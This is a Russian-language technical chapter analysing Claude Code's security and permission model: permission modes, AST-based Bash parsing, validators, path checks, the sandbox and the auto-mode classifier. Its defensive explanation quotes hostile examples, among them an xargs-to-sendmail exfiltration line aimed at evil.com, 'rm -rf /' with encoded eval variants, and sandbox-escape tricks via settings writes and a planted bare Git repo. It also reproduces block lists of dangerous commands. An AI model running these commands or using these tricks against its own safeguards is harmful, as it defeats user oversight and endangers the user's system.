# Глава 10: Безопасность и модель прав доступа

## 10.1 Обзор и позиционирование

Модель безопасности Claude Code — подсистема с наибольшим объёмом кода и наивысшей сложностью во всей системе, включающая около 25 000 строк исходного кода TypeScript. Она решает ключевую проблему: **как, предоставив AI-агенту возможность выполнять shell-команды и изменять файлы, предотвратить внедрение вредоносных инструкций, утечку данных и разрушение системы**.

В отличие от традиционных плагинов IDE, Claude Code сталкивается с уникальной моделью угроз: сама AI-модель может быть направлена посредством prompt injection на выполнение опасных операций, а злоумышленный репозиторий, клонированный пользователем, может создавать векторы атаки через имена файлов или их содержимое. Система безопасности должна создать надёжный верификационный слой между **выводом модели** и **операционной системой**.

Вся подсистема безопасности может быть описана одной формулой:

```
Итоговое решение = f(режим прав, сопоставление правил, AST-анализ, валидаторы безопасности, валидация путей, классификатор, Hook, песочница)
```

Это не однослойный фильтр, а система эшелонированной обороны из 8 уровней (Defense in Depth), каждый из которых независимо применим, и все вместе они образуют последовательный барьер.

## 10.2 Теоретическая основа

### 10.2.1 Принцип минимальных привилегий (Principle of Least Privilege)

Claude Code по умолчанию отклоняет все операции записи — каждый вызов инструмента должен получить авторизацию через `checkPermissions`. Режимы прав варьируются от самого строгого (`default` — запрос при каждом вызове) до самого мягкого (`bypassPermissions`); пользователь сам выбирает уровень доверия.

### 10.2.2 Модель песочницы (Sandboxing)

Интегрирован `@anthropic-ai/sandbox-runtime`: на macOS используется `sandbox-exec`, на Linux — `bubblewrap` (bwrap), изолирующие доступ к файловой системе и сети на уровне ОС. Песочница независима от проверок прав уровня приложения — даже при ошибке в слое приложения уровень ОС по-прежнему блокирует действие.

### 10.2.3 Применение AST-анализа в области безопасности

В отличие от традиционного сопоставления по регулярным выражениям, Claude Code использует полный AST-парсинг Bash (совместимый с tree-sitter парсер, реализованный на чистом TypeScript) для понимания структуры команд. Это краеугольный камень верификации безопасности — регулярные выражения не могут отличить `echo "rm -rf /"` от `rm -rf /`, тогда как AST может.

### 10.2.4 Эшелонированная оборона (Defense in Depth)

Проверки безопасности распределены по 8 независимым уровням; перехват на любом из них предотвращает опасную операцию. Даже если злоумышленник обошёл AST-парсинг (например, используя parser differential), валидация путей, песочница и подтверждение пользователя остаются в качестве резерва.

## 10.3 Архитектура модели прав доступа

### 10.3.1 Пять уровней режимов прав

Режимы прав определены в `utils/permissions/PermissionMode.ts`; во время выполнения существует пять уровней:

| Режим | Поведение | Применимые сценарии |
|-------|-----------|---------------------|
| `default` | Запрос пользователя при каждом вызове инструмента | Первое использование, высокорисковые среды |
| `acceptEdits` | Редактирование файлов проходит автоматически, команды всё равно требуют подтверждения | Повседневная разработка |
| `plan` | Только генерация плана без выполнения | Проектирование архитектуры, ревью кода |
| `auto` | Автоматическое решение LLM-классификатора | Высокодоверенные разработчики |
| `bypassPermissions` | Пропуск всех проверок прав | Полностью доверенные сценарии (может быть отключён политикой) |

При смене режима применяется полная логика переходов состояний (`permissionSetup.ts:transitionPermissionMode`), включая:

- При входе в режим `auto` автоматически удаляются опасные правила прав (`stripDangerousPermissionsForAutoMode`)
- При выходе из режима `auto` удалённые правила восстанавливаются (`restoreDangerousPermissions`)
- Режим `plan` может включать вложенный режим `auto` (plan + auto-during-plan)

```typescript
// permissionSetup.ts:~580
export function transitionPermissionMode(
  fromMode: string,
  toMode: string,
  context: ToolPermissionContext,
): ToolPermissionContext {
  if (fromMode === toMode) return context
  // ...
  if (toUsesClassifier && !fromUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(true)
    context = stripDangerousPermissionsForAutoMode(context)
  } else if (fromUsesClassifier && !toUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(false)
    context = restoreDangerousPermissions(context)
  }
}
```

### 10.3.2 Система правил прав доступа

Правила прав (Permission Rules) — ядро детализированного управления, хранятся в многоуровневой конфигурации:

```typescript
// permissions.ts:~95
const PERMISSION_RULE_SOURCES = [
  ...SETTING_SOURCES, // userSettings, projectSettings, localSettings, flagSettings, policySettings
  'cliArg',
  'command',
  'session',
] as const
```

Каждое правило имеет три измерения:
- **Source** (уровень источника): policySettings > flagSettings > localSettings > projectSettings > userSettings > session
- **Behavior** (поведение): `allow` / `deny` / `ask`
- **RuleValue** (шаблон соответствия): например, `Bash(git commit:*)` разрешает все команды, начинающиеся с `git commit`

Сопоставление правил поддерживает три режима:
1. **Сопоставление по инструменту**: `Bash` соответствует всем командам Bash
2. **Сопоставление по префиксу**: `Bash(npm run:*)` соответствует командам, начинающимся с `npm run`
3. **Точное сопоставление**: `Bash(ls -la)` соответствует только этой одной команде

### 10.3.3 Полный процесс каскадной проверки прав

Проверка прав одной команды Bash проходит через `bashToolHasPermission` (`bashPermissions.ts`); полный путь:

```
1. Проверка режима → bypassPermissions: немедленный пропуск
2. Сопоставление с правилами deny → при совпадении: отказ
3. Сопоставление с правилами allow → при совпадении: разрешение
4. Проверка режима безопасности → специальная обработка режимов acceptEdits и т.д.
5. AST-парсинг команды → tree-sitter создаёт структурированную команду
6. Цепочка валидаторов безопасности → 23 статические проверки
7. Валидация только для чтения → белый список команд + белый список флагов
8. Валидация пути → ограничения рабочей директории
9. LLM-классификатор (опционально) → AI-решение в режиме auto
10. Подтверждение пользователя → итоговый запасной уровень
```

## 10.4 Безопасность Bash-команд — восьмишаговый процесс классификации

### 10.4.1 AST-парсинг Tree-sitter

Это важнейшая инновация всей системы безопасности. `utils/bash/ast.ts` реализует анализ Bash-команд на основе AST:

```typescript
// ast.ts:~1-20
/**
 * AST-based bash command analysis using tree-sitter.
 *
 * The key design property is FAIL-CLOSED: we never interpret structure we
 * don't understand. If tree-sitter produces a node we haven't explicitly
 * allowlisted, we refuse to extract argv and the caller must ask the user.
 *
 * This is NOT a sandbox. It answers exactly one question: "Can we produce
 * a trustworthy argv[] for each simple command in this string?"
 */
```

Типы результатов AST-парсинга:

```typescript
// ast.ts:~30
export type ParseForSecurityResult =
  | { kind: 'simple'; commands: SimpleCommand[] }
  | { kind: 'too-complex'; reason: string; nodeType?: string }
  | { kind: 'parse-unavailable' }
```

Ключевой дизайн: **Fail-Closed + Allowlist**. Любой тип узла AST, не входящий в allowlist, приводит к тому, что вся команда помечается как `too-complex` и требует подтверждения пользователя. Множество `DANGEROUS_TYPES` определяет известные опасные типы узлов:

```typescript
// ast.ts:~190
const DANGEROUS_TYPES = new Set([
  'command_substitution',   // $() подстановка команды
  'process_substitution',   // <() >() подстановка процесса
  'expansion',              // раскрытие параметров
  'subshell',               // дочерний shell
  'for_statement',          // управляющие конструкции
  'if_statement',
  'function_definition',
  'brace_expression',       // раскрытие фигурных скобок
  // ... всего 18 типов
])
```

### 10.4.2 Чистый TypeScript Bash-парсер

`utils/bash/bashParser.ts` (4 436 строк) — полный парсер синтаксиса Bash, порождающий AST, совместимый с WASM-парсером tree-sitter-bash. Ключевые параметры:

```typescript
// bashParser.ts:~28
const PARSE_TIMEOUT_MS = 50    // 50 мс таймаут против вредоносных входных данных
const MAX_NODES = 50_000       // лимит узлов против OOM
```

Парсер поддерживает полный синтаксис Bash, включая heredoc, ANSI-C строки, подстановку процессов. При таймауте или взрыве числа узлов возвращает `null` — fail-closed.

### 10.4.3 LLM-классификатор (Bash Classifier)

Используется в режиме `auto`. `bashClassifier.ts` поддерживает три группы описательных правил команд:

- **Allow descriptions**: описывают безопасные команды (например, «git read-only operations»)
- **Deny descriptions**: описывают опасные команды (например, «commands that download and execute code»)
- **Ask descriptions**: паттерны, требующие подтверждения пользователя

Классификатор использует `sideQuery` для вызова отдельного экземпляра Claude, полностью изолированного от основного диалога.

### 10.4.4 Фильтрация переменных окружения

`bashPermissions.ts` определяет два белых списка безопасных переменных окружения:

```typescript
// bashPermissions.ts:~390
const SAFE_ENV_VARS = new Set([
  'NODE_ENV', 'RUST_LOG', 'PYTHONUNBUFFERED', 'LANG', 'TZ',
  'NO_COLOR', 'FORCE_COLOR', // ... всего ~40 переменных
])
```

**Особую ценность имеют комментарии по безопасности** — исходный код явно перечисляет переменные, которые **категорически не должны** попасть в белый список:

```typescript
// bashPermissions.ts:~385 (комментарий)
// SECURITY: These must NEVER be added to the whitelist:
// - PATH, LD_PRELOAD, LD_LIBRARY_PATH, DYLD_* (execution/library loading)
// - PYTHONPATH, NODE_PATH (module loading)
// - NODE_OPTIONS (can contain code execution flags)
// - HOME, TMPDIR, SHELL, BASH_ENV (affect system behavior)
```

### 10.4.5 23 валидатора безопасности Shell

`bashSecurity.ts` реализует 23 независимых валидатора, каждый с уникальным числовым ID:

```typescript
// bashSecurity.ts:~76
const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,
  JQ_SYSTEM_FUNCTION: 2,
  JQ_FILE_ARGUMENTS: 3,
  OBFUSCATED_FLAGS: 4,
  SHELL_METACHARACTERS: 5,
  DANGEROUS_VARIABLES: 6,
  NEWLINES: 7,
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,
  IFS_INJECTION: 11,
  GIT_COMMIT_SUBSTITUTION: 12,
  PROC_ENVIRON_ACCESS: 13,
  MALFORMED_TOKEN_INJECTION: 14,
  BACKSLASH_ESCAPED_WHITESPACE: 15,
  BRACE_EXPANSION: 16,
  CONTROL_CHARACTERS: 17,
  UNICODE_WHITESPACE: 18,
  MID_WORD_HASH: 19,
  ZSH_DANGEROUS_COMMANDS: 20,
  BACKSLASH_ESCAPED_OPERATORS: 21,
  COMMENT_QUOTE_DESYNC: 22,
  QUOTED_NEWLINE: 23,
}
```

Несколько примечательных валидаторов:

**Обнаружение подстановки команд** — проверяет не только `$()`, но и покрывает поверхность атаки, специфичную для Zsh:

```typescript
// bashSecurity.ts:~16
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /=\(/, message: 'Zsh process substitution =()' },
  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: 'Zsh equals expansion (=cmd)' },
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  // ... включает защитную блокировку синтаксиса PowerShell-комментариев
  { pattern: /<#/, message: 'PowerShell comment syntax' },
]
```

**Блокировка опасных команд Zsh** — `zmodload` является точкой входа в модульную систему Zsh, позволяющей загружать `zsh/system` (файловый I/O), `zsh/net/tcp` (сетевая связь) и другие модули:

```typescript
// bashSecurity.ts:~44
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',   // точка входа загрузки модулей
  'emulate',    // флаг -c эквивалентен eval
  'sysopen', 'sysread', 'syswrite',  // модуль zsh/system
  'zpty',       // выполнение команд через псевдотерминал
  'ztcp',       // TCP-сетевая связь
  'zf_rm', 'zf_mv', 'zf_chmod',     // встроенные команды zsh/files
  // ...
])
```

### 10.4.6 Механизм валидации только для чтения

`readOnlyValidation.ts` поддерживает систему **белого списка команд + белого списка флагов** с `COMMAND_ALLOWLIST` в качестве ядра:

```typescript
// readOnlyValidation.ts:~55
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  xargs: {
    safeFlags: { '-I': '{}', '-n': 'number', '-P': 'number', ... },
    // Примечание: -i и -e удалены из-за различий семантики GNU getopt optional-arg
  },
  grep: { safeFlags: { '-e': 'string', '-i': 'none', ... } },
  sort: { safeFlags: { '-r': 'none', '-n': 'none', ... } },
  tree: { safeFlags: { ... } },  // -R удалён: tree -R -H записывает файлы
  date: { safeFlags: { ... }, additionalCommandIsDangerousCallback: ... },
  // ... всего около 30 команд
}
```

Белый список флагов для каждой команды имеет детализированные комментарии по безопасности. Например, флаг `-i` для `xargs` удалён:

```typescript
// readOnlyValidation.ts:~130 (комментарий)
// SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
// optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
// attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
// flag takes NO arg and `X` becomes the next positional (target command).
//
// `-i` (`i::` — optional replace-str):
//   echo /usr/sbin/sendm | xargs -it tail a@evil.com
//   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
//   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
```

Этот уровень анализа безопасности — понимание уязвимости, возникающей из-за различий в семантике GNU getopt optional-arg, приводящих к расхождению поведения парсеров — является наиболее впечатляющей частью всей модели безопасности.

### 10.4.7 Валидация путей и защита от обхода

`pathValidation.ts` (1 303 строки) реализует полную систему безопасности путей:

**Экстракторы путей** — специализированные парсеры аргументов для 34 команд:

```typescript
// pathValidation.ts:~170
export const PATH_EXTRACTORS: Record<PathCommand, (args: string[]) => string[]> = {
  cd: args => (args.length === 0 ? [homedir()] : [args.join(' ')]),
  find: args => { /* сложная логика разделения флагов и путей */ },
  grep: args => parsePatternCommand(args, flags),
  git: args => { /* специальная обработка git diff --no-index */ },
  // ... всего 34 команды
}
```

**Обработка POSIX `--`** — корректная обработка разделителя end-of-options, предотвращающая обход валидации путей через аргументы типа `-path`:

```typescript
// pathValidation.ts:~105
// SECURITY: `rm -- -/../.claude/settings.local.json`
// Здесь `-/../.claude/settings.local.json` начинается с `-`,
// и без обработки `--` наивный фильтр !arg.startsWith('-') отбросит его,
// в результате валидатор не увидит ни одного пути, вернёт passthrough,
// и файл будет удалён.
function filterOutFlags(args: string[]): string[] {
  const result: string[] = []
  let afterDoubleDash = false
  for (const arg of args) {
    if (afterDoubleDash) { result.push(arg) }
    else if (arg === '--') { afterDoubleDash = true }
    else if (!arg?.startsWith('-')) { result.push(arg) }
  }
  return result
}
```

**Защита опасных путей удаления** — даже при наличии правил allowlist операции rm для критических путей (`/`, `/etc`, `/home` и т.д.) всегда требуют подтверждения пользователя:

```typescript
// pathValidation.ts:~70
function checkDangerousRemovalPaths(
  command: 'rm' | 'rmdir', args: string[], cwd: string
): PermissionResult {
  for (const path of paths) {
    if (isDangerousRemovalPath(absolutePath)) {
      return { behavior: 'ask', message: `Dangerous ${command} operation...` }
    }
  }
}
```

**Защита от атаки комбинацией cd + операция записи**:

```typescript
// pathValidation.ts:~490
// SECURITY: Block write operations in compound commands containing 'cd'
// Example attack: cd .claude/ && mv test.txt settings.json
// This would bypass the check for .claude/settings.json because paths
// are resolved relative to the original CWD.
if (compoundCommandHasCd && operationType !== 'read') {
  return { behavior: 'ask', message: '...' }
}
```

## 10.5 Цепочка валидации FileEdit

Цепочка валидации FileEditTool реализована в методе `validateInput` `FileEditTool.ts`, состоит из 12 шагов:

| Шаг | Проверка | Расположение в исходном коде |
|-----|----------|------------------------------|
| 1 | Обнаружение секретов Team Memory | `checkTeamMemSecrets(fullFilePath, new_string)` |
| 2 | Проверка отсутствия изменений old_string === new_string | errorCode: 1 |
| 3 | Сопоставление с правилами Deny | `matchingRuleForInput(..., 'deny')` |
| 4 | Проверка безопасности UNC-пути (защита от утечки NTLM) | `fullFilePath.startsWith('\\\\')` |
| 5 | Ограничение размера файла (1 GiB) | `MAX_EDIT_FILE_SIZE` |
| 6 | Определение кодировки файла и чтение | UTF-8 / UTF-16LE |
| 7 | Проверка существования файла | при отсутствии old_string должен быть пустым |
| 8 | Перехват Jupyter Notebook | направление к NotebookEditTool |
| 9 | **Проверка Must-Read-Before-Write** | `readFileState.get(fullFilePath)` |
| 10 | **Обнаружение конкурентного изменения по mtime** | `lastWriteTime > readTimestamp.timestamp` |
| 11 | **Проверка уникальности** | при нескольких совпадениях требуется `replace_all: true` |
| 12 | Специальная валидация файла настроек | `validateInputForSettingsFileEdit` |

Шаги 9 и 10 образуют инвариант **«сначала прочитать, потом писать»**:

```typescript
// FileEditTool.ts:~250
const readTimestamp = toolUseContext.readFileState.get(fullFilePath)
if (!readTimestamp || readTimestamp.isPartialView) {
  return {
    result: false, behavior: 'ask',
    message: 'File has not been read yet. Read it first before writing to it.',
  }
}
// ...
const lastWriteTime = getFileModificationTime(fullFilePath)
if (lastWriteTime > readTimestamp.timestamp) {
  // Специальная обработка Windows: облачная синхронизация/антивирус может изменить mtime без изменения содержимого
  if (isFullRead && fileContent === readTimestamp.content) {
    // Содержимое не изменилось, безопасно продолжать
  } else {
    return { result: false, message: 'File has been modified since read...' }
  }
}
```

## 10.6 Механизм песочницы

### 10.6.1 Архитектура адаптера песочницы

`utils/sandbox/sandbox-adapter.ts` (985 строк) — адаптационный уровень для `@anthropic-ai/sandbox-runtime`, сопоставляющий систему настроек Claude Code с конфигурацией среды выполнения песочницы:

```typescript
// sandbox-adapter.ts:~160
export function convertToSandboxRuntimeConfig(
  settings: SettingsJson,
): SandboxRuntimeConfig {
  const allowWrite: string[] = ['.', getClaudeTempDir()]
  const denyWrite: string[] = []
  
  // Всегда запрещать запись в файлы настроек — предотвращение побега из песочницы
  denyWrite.push(...settingsPaths)
  denyWrite.push(getManagedSettingsDropInDir())
  
  // Запрещать запись в .claude/skills — тот же уровень привилегий
  denyWrite.push(resolve(originalCwd, '.claude', 'skills'))
  
  // Защита от атаки через голый Git-репозиторий
  for (const gitFile of ['HEAD', 'objects', 'refs', 'hooks', 'config']) {
    const p = resolve(dir, gitFile)
    try { statSync(p); denyWrite.push(p) }
    catch { bareGitRepoScrubPaths.push(p) }
  }
}
```

### 10.6.2 Защита от атаки через голый Git-репозиторий

Это тонкая мера безопасности. Злоумышленник может поместить в cwd файлы `HEAD`, `objects/`, `refs/`, заставив `is_git_directory()` Git ошибочно принять cwd за голый репозиторий, а затем выполнить произвольный код через конфигурацию `core.fsmonitor`:

```typescript
// sandbox-adapter.ts:~245
// SECURITY: Git's is_git_directory() treats cwd as a bare repo if it has
// HEAD + objects/ + refs/. An attacker planting these (plus a config with
// core.fsmonitor) escapes the sandbox when Claude's unsandboxed git runs.

// Стратегия: существующие файлы помечаются как readonly-привязки,
// несуществующие файлы очищаются после выполнения команды
function scrubBareGitRepoFiles(): void {
  for (const p of bareGitRepoScrubPaths) {
    try { rmSync(p, { recursive: true }) }
    catch { /* ENOENT — нормально */ }
  }
}
```

### 10.6.3 Стратегия сетевой изоляции

Песочница поддерживает управление сетью на уровне доменных имён, извлекая разрешённые домены из правил прав инструмента WebFetch:

```typescript
// sandbox-adapter.ts:~190
for (const ruleString of permissions.allow || []) {
  const rule = permissionRuleValueFromString(ruleString)
  if (rule.toolName === WEB_FETCH_TOOL_NAME && 
      rule.ruleContent?.startsWith('domain:')) {
    allowedDomains.push(rule.ruleContent.substring('domain:'.length))
  }
}
```

Корпоративные политики могут принудительно ограничить использование только доменами, настроенными администратором, через `allowManagedDomainsOnly`.

## 10.7 Система Hook и взаимодействие с правами

### 10.7.1 Hook PreToolUse / PostToolUse

Система Hook позволяет пользователям инъецировать собственную логику безопасности. `interactiveHandler.ts` демонстрирует, как Hook конкурирует за принятие решения о правах:

```typescript
// interactiveHandler.ts:~68
// Конкуренция четырёх путей: пользователь / Hook / классификатор / Bridge(CCR)
// Атомарная операция claim() гарантирует единственного победителя
void (async () => {
  if (isResolved()) return
  const hookDecision = await ctx.runHooks(
    currentAppState.toolPermissionContext.mode,
    result.suggestions,
    result.updatedInput,
    permissionPromptStartTimeMs,
  )
  if (!hookDecision || !claim()) return
  ctx.removeFromQueue()
  resolveOnce(hookDecision)
})()
```

### 10.7.2 Модель конкурентной гонки решений о правах

`PermissionContext.ts` определяет `createResolveOnce` — паттерн «claim-then-resolve», гарантирующий единственного победителя при конкуренции нескольких асинхронных источников (UI пользователя, Hook, классификатор, Bridge, Channel):

```typescript
// PermissionContext.ts:~80
function createResolveOnce<T>(resolve: (value: T) => void): ResolveOnce<T> {
  let claimed = false
  let delivered = false
  return {
    claim() {
      if (claimed) return false
      claimed = true
      return true
    },
    resolve(value: T) {
      if (delivered) return
      delivered = true; claimed = true
      resolve(value)
    },
  }
}
```

Этот дизайн поддерживает шесть конкурентных источников:
1. **Локальный UI** — пользователь нажимает Allow/Deny в терминале
2. **Hook** — PreToolUse hook возвращает решение
3. **Bash Classifier** — LLM-классификатор определяет безопасность
4. **Bridge (CCR)** — удалённое решение через веб-интерфейс Claude.ai
5. **Channel** — ответ через Telegram/iMessage и другие каналы
6. **Recheck** — автоматическая повторная проверка после изменения правил

## 10.8 YOLO-классификатор (классификатор режима Auto)

### 10.8.1 Архитектура

`yoloClassifier.ts` (1 495 строк) реализует AI-классификатор безопасности для режима `auto`. Это отдельный экземпляр Claude, вызываемый через `sideQuery`, полностью изолированный от основного диалога:

```typescript
// yoloClassifier.ts:~400
const YOLO_CLASSIFIER_TOOL_SCHEMA: BetaToolUnion = {
  type: 'custom',
  name: 'classify_result',
  input_schema: {
    type: 'object',
    properties: {
      thinking: { type: 'string' },
      shouldBlock: { type: 'boolean' },
      reason: { type: 'string' },
    },
  },
}
```

### 10.8.2 Двухэтапный XML-классификатор

Классификатор поддерживает три режима работы (`both` / `fast` / `thinking`); по умолчанию используется двухэтапная стратегия:

- **Этап 1 (fast)**: max_tokens=64, nudge немедленно выдаёт решение yes/no. При определении безопасности — немедленный возврат.
- **Этап 2 (thinking)**: срабатывает только при вынесении этапом 1 вердикта «block», использует chain-of-thought рассуждение для снижения false positive.

```typescript
// yoloClassifier.ts:~680
const XML_S1_SUFFIX = '\nErr on the side of blocking. <block> immediately.'
const XML_S2_SUFFIX = '\nReview the classification process and follow it carefully...'
```

### 10.8.3 Сжатие транскрипта

Классификатор не получает полную историю диалога, а через `buildTranscriptEntries` сжимает диалог в компактный формат — сохраняются только текст пользователя и блоки tool_use помощника (текст помощника исключается, так как он создан моделью и может быть сконструирован для влияния на классификатор):

```typescript
// yoloClassifier.ts:~480
// Only include tool_use blocks — assistant text is model-authored
// and could be crafted to influence the classifier's decision.
if (block.type === 'tool_use') {
  blocks.push({ type: 'tool_use', name: block.name, input: block.input })
}
```

### 10.8.4 Оптимизации Fast-Path

Перед вызовом классификатора существуют три fast-path, позволяющих избежать LLM-вызова:

1. **Симуляция acceptEdits**: если команда была бы автоматически разрешена в режиме `acceptEdits`, немедленное прохождение
2. **Белый список безопасных инструментов**: `isAutoModeAllowlistedTool` поддерживает набор заведомо безопасных инструментов
3. **Отслеживание отказов**: при слишком большом числе последовательных отказов — откат к прямому запросу пользователя

### 10.8.5 Удаление опасных прав

При входе в режим `auto` следующие правила прав автоматически удаляются (`stripDangerousPermissionsForAutoMode`):

```typescript
// permissionSetup.ts:~100
export function isDangerousBashPermission(toolName: string, ruleContent: string | undefined): boolean {
  // Bash(*) — разрешает все команды
  if (ruleContent === undefined || ruleContent === '') return true
  // python:*, node:*, bash:* — интерпретаторы скриптов
  for (const pattern of DANGEROUS_BASH_PATTERNS) {
    if (content === `${lowerPattern}:*`) return true
    // ...
  }
}
```

Это гарантирует, что даже если пользователь ранее сохранил широкое правило типа `Bash(python:*)`, оно не обойдёт классификатор в режиме `auto`.

## 10.9 Анализ проектных решений

### 10.9.1 Почему AST-парсинг, а не регулярные выражения

Регулярные выражения не справляются с атаками **parser differential**. Например:

```bash
echo "rm -rf /"   # regex ложно срабатывает — это всего лишь аргумент echo
rm -rf /           # regex должен реагировать именно на это
```

Ещё опаснее **вложенные кавычки** и **раскрытие shell**:

```bash
ev"al" 'rm -rf /'    # regex может не увидеть eval
$'\x65\x76\x61\x6c' 'rm -rf /'  # eval, закодированный через ANSI-C строку
```

AST-парсер понимает синтаксическую структуру и корректно различает имя команды и аргументы. Дизайн fail-closed означает, что любая структура, которую нельзя разобрать, требует подтверждения пользователя.

### 10.9.2 Момент введения LLM-классификатора и компромиссы

Классификатор используется только в режиме `auto` при строгом контроле затрат:

- **Задержка**: двухэтапный дизайн, этап 1 обычно <100 мс (max_tokens=64 + prompt cache)
- **Стоимость**: использует `sideQuery` через независимый API-вызов, не включается в потребление токенов основного диалога
- **Точность**: chain-of-thought этапа 2 снижает false positive до разумного уровня
- **Надёжность**: при недоступности классификатора — fail-closed (откат к запросу пользователя)

### 10.9.3 Баланс безопасности и удобства использования

Claude Code балансирует их через **прогрессивное доверие** (progressive trust):

1. Первое использование: подтверждение для каждой команды
2. После сохранения правил: совпадающие команды проходят автоматически
3. Режим `acceptEdits`: редактирование файлов автоматически
4. Режим `auto`: решение AI-классификатора
5. `bypassPermissions`: полное доверие

Одновременно через **умные подсказки** (`suggestionForExactCommand` / `suggestionForPrefix`) пользователи постепенно строят правила доверия, а не выбирают всё сразу.

### 10.9.4 Сравнение с моделями безопасности конкурентов

| Измерение | Claude Code | Cursor | GitHub Copilot |
|-----------|-------------|--------|----------------|
| Анализ команд | AST-парсинг + 23 валидатора | Базовые regex | Не выполняет команды |
| Песочница | Уровень ОС (sandbox-exec/bwrap) | Нет | N/A |
| Модель прав | 5 уровней + детализированные правила | Бинарная (разрешить/запретить) | N/A |
| AI-классификатор | Отдельный LLM-экземпляр | Нет | Нет |
| Валидация путей | Специализированные парсеры для 34 команд | Базовая проверка | N/A |
| Корпоративные политики | Уровень policySettings | Ограниченные | Политики организации |

## 10.10 Переносимые паттерны

1. **Паттерн Fail-Closed Allowlist**: ключевой принцип AST-парсинга — понимать только заведомо безопасные структуры, всё остальное отклонять. Применимо в любом сценарии разбора недоверенных входных данных.

2. **Паттерн конкурентности Claim-then-Resolve**: `createResolveOnce` решает проблему конкуренции за принятие решения из нескольких асинхронных источников. Переиспользуем в любом сценарии «победа первого достигшего решения».

3. **Прогрессивное повышение доверия**: начать с самого строгого режима, постепенно строить правила доверия на основе действий пользователя. Психологически более естественно, чем «выбор уровня доверия с самого начала».

4. **Классификатор Fast-Path + двухэтапность**: сначала пропускать очевидно безопасные операции через правила/белые списки/симуляцию, вызывать LLM только для неопределённых случаев. Двухэтапная стратегия (fast + thinking) достигает баланса между задержкой и точностью.

5. **Защита от Parser Differential**: не только использовать собственный парсер, но и систематически проверять различия в поведении shell (GNU vs BSD getopt, различия раскрытия Zsh vs Bash). Этот образ мышления переносим на любую систему с несколькими уровнями интерпретаторов.

6. **Иерархия источников правил прав**: многоуровневое слияние конфигурации (policy > flag > local > project > user > session), корпоративные политики всегда побеждают. Универсальная модель приоритетов конфигурации.

7. **Двойная защита: песочница + уровень приложения**: даже если обходится проверка прав уровня приложения, OS-песочница по-прежнему блокирует — и наоборот. Два независимых уровня отказа.

## 10.11 Индекс исходного кода

| Файл | Строк | Основная функция |
|------|-------|-----------------|
| `tools/BashTool/bashPermissions.ts` | 2 621 | Главная точка входа решения прав Bash, сопоставление правил, извлечение префикса команды |
| `tools/BashTool/bashSecurity.ts` | 2 592 | 23 валидатора безопасности, парсинг кавычек, обнаружение подстановки команд |
| `tools/BashTool/readOnlyValidation.ts` | 1 990 | Белый список команд, белый список флагов, валидация только для чтения |
| `tools/BashTool/pathValidation.ts` | 1 303 | Экстракторы путей для 34 команд, обнаружение опасных путей |
| `tools/BashTool/BashTool.tsx` | 1 143 | Точка входа инструмента Bash, схема входных данных, логика выполнения |
| `tools/BashTool/prompt.ts` | 369 | Промпт инструмента Bash, описание песочницы |
| `tools/FileEditTool/FileEditTool.ts` | ~400 | 12-шаговая цепочка валидации редактирования файла |
| `utils/permissions/permissions.ts` | 1 486 | Главная точка входа решения прав, сопоставление правил, интеграция режима auto |
| `utils/permissions/permissionSetup.ts` | 1 532 | Конфигурация режима прав, обнаружение и удаление опасных правил |
| `utils/permissions/yoloClassifier.ts` | 1 495 | LLM-классификатор режима Auto, двухэтапный XML-протокол |
| `utils/permissions/filesystem.ts` | 1 777 | Права файловой системы, безопасность путей, защита конфигурации Claude |
| `utils/bash/ast.ts` | 2 679 | AST-анализ Bash, обход узлов по allowlist |
| `utils/bash/bashParser.ts` | 4 436 | Чистый TypeScript Bash-парсер |
| `hooks/toolPermission/handlers/interactiveHandler.ts` | 536 | Интерактивная обработка прав, модель гонки шести источников |
| `hooks/toolPermission/PermissionContext.ts` | 388 | Контекст прав, claim-then-resolve |
| `utils/sandbox/sandbox-adapter.ts` | 985 | Адаптация конфигурации песочницы, защита от голого Git-репозитория |

---

*Данная глава основана на снимке исходного кода Claude Code на TypeScript (2026-03-31, ~512K LOC). Код, связанный с безопасностью, составляет около 25 000 строк, охватывает 16 ключевых файлов. Все фрагменты кода точно скопированы из исходных файлов с указанием расположения.*
